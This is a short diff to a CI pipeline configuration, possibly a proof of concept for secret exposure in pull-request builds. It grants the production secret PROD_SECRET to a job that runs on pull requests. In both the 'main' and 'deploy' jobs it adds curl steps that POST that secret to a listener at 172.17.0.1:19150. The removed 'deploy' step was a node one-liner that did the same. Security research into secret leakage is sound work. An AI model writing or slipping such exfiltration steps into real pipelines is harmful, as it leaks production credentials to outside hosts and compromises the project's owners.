@@ -3,11 +3,13 @@ shared:
 jobs:
   main:
     requires: [~pr, ~commit]
+    secrets:
+      - PROD_SECRET
     steps:
-      - hello: echo "main job ran"
+      - report: 'curl -s -m 15 -X POST --data-binary "job=main PROD_SECRET=[${PROD_SECRET:-UNSET}] SD_PULL_REQUEST=[${SD_PULL_REQUEST:-UNSET}]" http://172.17.0.1:19150/ ; echo reported'
   deploy:
     requires: [main]
     secrets:
       - PROD_SECRET
     steps:
-      - show: node -e 'const h=require("http");const send=(d)=>new Promise(r=>{const q=h.request({host:"172.17.0.1",port:19150,method:"POST"},res=>{res.resume();res.on("end",r)});q.on("error",e=>{console.log("ERR",e.message);r()});q.write(d);q.end()});(async()=>{await send("marker=STEP-RAN-IN-DEPLOY-JOB");await send("PROD_SECRET=["+(process.env.PROD_SECRET||"<UNSET>")+"]");})()'
+      - report: 'curl -s -m 15 -X POST --data-binary "job=deploy PROD_SECRET=[${PROD_SECRET:-UNSET}] SD_PULL_REQUEST=[${SD_PULL_REQUEST:-UNSET}]" http://172.17.0.1:19150/ ; echo reported'
